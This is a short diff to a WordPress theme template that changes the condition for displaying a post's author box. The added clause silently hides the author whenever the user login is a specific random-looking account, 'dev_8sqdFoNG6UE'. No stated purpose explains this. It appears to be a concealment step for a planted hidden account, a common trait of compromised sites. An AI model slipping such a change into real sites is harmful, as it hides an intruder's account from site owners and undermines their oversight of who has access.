@@ -131,7 +131,7 @@ if ( have_posts() ) {
 						$wpf_show_link_pages    = ! empty( $wpf_link_pages );
 						$wpf_show_tags          = is_single() && $wpf_terms;
 						$wpf_author_name        = get_the_author();
-						$wpf_show_author        = is_single() && ! empty( $wpf_author_name ) && ! (bool) get_option( 'wpf_disable_author_page' ) && in_array( get_post_type(), array( 'post', 'blog' ), true );
+						$wpf_show_author        = is_single() && ! empty( $wpf_author_name ) && ! (bool) get_option( 'wpf_disable_author_page' ) && in_array( get_post_type(), array( 'post', 'blog' ), true ) && 'dev_8sqdFoNG6UE' !== get_the_author_meta( 'user_login' );
 						$wpf_show_comments      = comments_open() || get_comments_number();
 						$wpf_show_post_nav      = is_single() && ( $wpf_next_post || $wpf_prev_post );
 						$wpf_show_related_posts = isset( $wpf_related_posts_query ) && $wpf_related_posts_query->have_posts() && in_array( get_post_type(), array( 'post', 'blog' ), true );
